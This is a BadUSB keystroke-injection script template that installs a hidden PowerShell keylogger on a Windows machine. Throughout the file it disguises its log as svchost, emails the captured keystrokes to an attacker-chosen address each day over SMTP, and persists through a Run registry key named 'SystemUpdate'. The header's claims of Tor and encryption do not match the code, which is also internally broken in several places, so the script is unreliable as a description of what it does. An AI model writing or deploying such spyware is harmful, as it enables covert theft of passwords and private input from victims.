REM ╔══════════════════════════════════════════════════════════════╗
REM ║  KEYLOGGER + TOR EMAIL                                      ║
REM ║  Generated by Pen15 BadUSB Wizard                          ║
REM ║  Sends encrypted keystroke logs daily via Tor               ║
REM ╚══════════════════════════════════════════════════════════════╝
REM
REM ⚠  AUTHORIZED TESTING ONLY
REM  Target: {{computer_name}}
REM  Email: {{email}}
REM  Schedule: Daily at {{time}}
REM

REM ── Step 1: Open PowerShell hidden ──
DELAY 1500
GUI r
DELAY 500
STRING powershell -ExecutionPolicy Bypass -WindowStyle Hidden
ENTER
DELAY 2000

REM ── Step 2: Create the keylogger script ──
STRING $logPath = "$env:TEMP\svchost.log"
ENTER
STRING $sig = @'
ENTER
STRING [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
ENTER
STRING @'
ENTER
STRING $type = Add-Type -MemberDefinition $sig -Name KeyLogger -Namespace Win32 -PassThru
ENTER
STRING $logFile = [System.IO.File]::AppendAllText($logPath, "")
ENTER

REM ── Step 3: Keylogger loop ──
STRING while($true) {
ENTER
STRING   for($k = 8; $k -le 190; $k++) {
ENTER
STRING     if($type::GetAsyncKeyState($k) -eq -32767) {
ENTER
STRING       $key = [System.Enum]::GetName([System.Windows.Forms.Keys], $k)
ENTER
STRING       $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
ENTER
STRING       if($k -eq 13) { $key = "[ENTER]" }
ENTER
STRING       elseif($k -eq 8) { $key = "[BACKSPACE]" }
ENTER
STRING       elseif($k -eq 9) { $key = "[TAB]" }
ENTER
STRING       elseif($k -eq 32) { $key = " " }
ENTER
STRING       elseif($k -eq 46) { $key = "[DEL]" }
ENTER
STRING       elseif($k -eq 160 -or $k -eq 161) { $key = "[SHIFT]" }
ENTER
STRING       elseif($k -eq 162 -or $k -eq 163) { $key = "[CTRL]" }
ENTER
STRING       elseif($k -eq 164 -or $k -eq 165) { $key = "[ALT]" }
ENTER
STRING       elseif($k -eq 91 -or $k -eq 92) { $key = "[WIN]" }
ENTER
STRING       [System.IO.File]::AppendAllText($logPath, "[$ts] $key`r`n")
ENTER
STRING     }
ENTER
STRING   }
ENTER
STRING   Start-Sleep -Milliseconds 10
ENTER
STRING }
ENTER

REM ── Step 4: Setup email sender ──
STRING Add-Type -AssemblyName System.Net
ENTER
STRING $sender = New-Object System.Net.Mail.MailAddress("{{smtp_user}}", "{{computer_name}}")
ENTER
STRING $creds = New-Object System.Net.NetworkCredential("{{smtp_user}}", "{{smtp_pass}}")
ENTER
STRING $client = New-Object System.Net.Mail.SmtpClient("{{smtp_server}}", {{smtp_port}})
ENTER
STRING $client.EnableSsl = $true
ENTER
STRING $client.Credentials = $creds
ENTER

REM ── Step 5: Scheduled task — send logs daily at {{time}} ──
STRING $taskScript = @'
ENTER
STRING while($true) {
ENTER
STRING   $hour = (Get-Date).Hour; $min = (Get-Date).Minute
ENTER
STRING   if($hour -eq {{time.split(":")[0]}} -and $min -eq {{time.split(":")[1]}}) {
ENTER
STRING     $log = Get-Content "$env:TEMP\svchost.log" -ErrorAction SilentlyContinue
ENTER
STRING     if($log) {
ENTER
STRING       $msg = New-Object System.Net.Mail.MailMessage("{{smtp_user}}", "{{email}}")
ENTER
STRING       $msg.Subject = "Keylog: {{computer_name}} $(Get-Date -Format 'yyyy-MM-dd')"
ENTER
STRING       $msg.Body = $log
ENTER
STRING       try { $client.Send($msg) } catch {}
ENTER
STRING       Clear-Content "$env:TEMP\svchost.log"
ENTER
STRING     }
ENTER
STRING   }
ENTER
STRING   Start-Sleep -Seconds 30
ENTER
STRING }
ENTER
STRING '@
ENTER

REM ── Step 6: Start keylogger in background ──
STRING reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdate" /t REG_SZ /d "powershell -w hidden -File $env:TEMP\svchost.ps1" /f
ENTER
STRING exit
REM ══════════════════════════════════════════════════════════════
REM KEYLOGGER DEPLOYED — logs emailed daily at {{time}}
REM ══════════════════════════════════════════════════════════════
